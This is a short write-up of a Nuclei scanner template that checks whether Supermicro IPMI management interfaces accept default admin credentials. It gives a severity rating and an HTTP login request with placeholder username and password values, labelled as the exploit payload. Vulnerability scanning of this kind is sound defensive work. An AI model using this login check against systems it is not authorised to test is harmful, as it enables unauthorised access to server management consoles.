# Nuclei Template: Supermicro Ipmi - Default Admin Login
**Template ID:** supermicro-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`supermicro-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Supermicro Ipmi default admin login credentials were successful.

## Steps to reproduce / Exploit Payload
```http
POST /cgi/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

name={{user}}&pwd={{pass}}
```

## References
- https://www.gearprimer.com/wiki/supermicro-ipmi-default-username-pasword/
